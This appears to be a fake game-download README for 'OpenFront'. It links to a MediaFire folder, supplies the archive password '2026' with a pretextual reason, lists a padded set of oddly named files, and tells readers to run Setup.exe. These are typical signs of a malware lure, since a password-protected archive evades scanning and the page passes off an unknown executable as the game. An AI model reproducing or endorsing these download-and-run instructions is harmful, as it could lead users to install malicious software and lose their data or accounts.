## 🕹️ About

OpenFront is a massively multiplayer real-time strategy and battle-royale game developed and published by OpenFront Inc with Evan Pellegrini. Players compete on shared maps based on real-world geography, expanding territory, managing resources, building defenses, and eliminating rival nations. Alliances and diplomacy are central to surviving long enough to dominate the map, while each match rewards careful planning and rapid tactical decisions. OpenFront is currently available in Early Access, with fast-paced online battles supporting large numbers of players. This release is packaged for straightforward installation of the full game.

OpenFront is made for players who enjoy competitive online strategy, map control, diplomacy, and fast tactical decision-making.

## ✨ Features

- 🏗️ **Resource Management** — Balance economic growth, military pressure, and defensive capabilities.
- ⚔️ **Massive Multiplayer Battles** — Fight alongside and against hundreds of players in real time.
- 🌍 **Shared World Maps** — Compete across large maps inspired by real-world geography.
- 🤝 **Alliances** — Cooperate with other players for defense, pressure, and coordinated attacks.
- 🗺️ **Territorial Expansion** — Capture land, grow your nation, and control strategic regions.
- ☢️ **Battle Royale Pressure** — Outlast competing nations until only the strongest powers remain.

### Step 1: Download

Download the package from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the setup expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- dlc.md5 <- DLC checksums
|-- localization.ini <- Language files
|-- driver.umap <- Driver data
|-- bootstrap.wem <- Bootstrap audio
|-- res.pak <- Resources archive
|-- update_1.ini <- Update config
|-- lang.sys <- Language system
|-- Password 2026.txt <- Password reminder (empty)
|-- update_1.res <- Update resources
|-- physics.sys <- Physics engine
|-- api.pak <- API modules
|-- global.cfg <- Global settings
|-- uninstall.key <- Uninstall key
|-- license.wem <- Audio assets
|-- settings.bin <- Configuration
|-- installer.dat <- Installer data
|-- patch_1.bnk <- Audio banks
|-- scripts.lic <- Game scripts
|-- animations.dll <- Animation system
|-- audio.res <- Audio resources
|-- assets.wem <- Asset audio
|-- driver.pak <- Driver archive
|-- launcher.dll <- Launcher library
|-- license.bank <- License data
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start
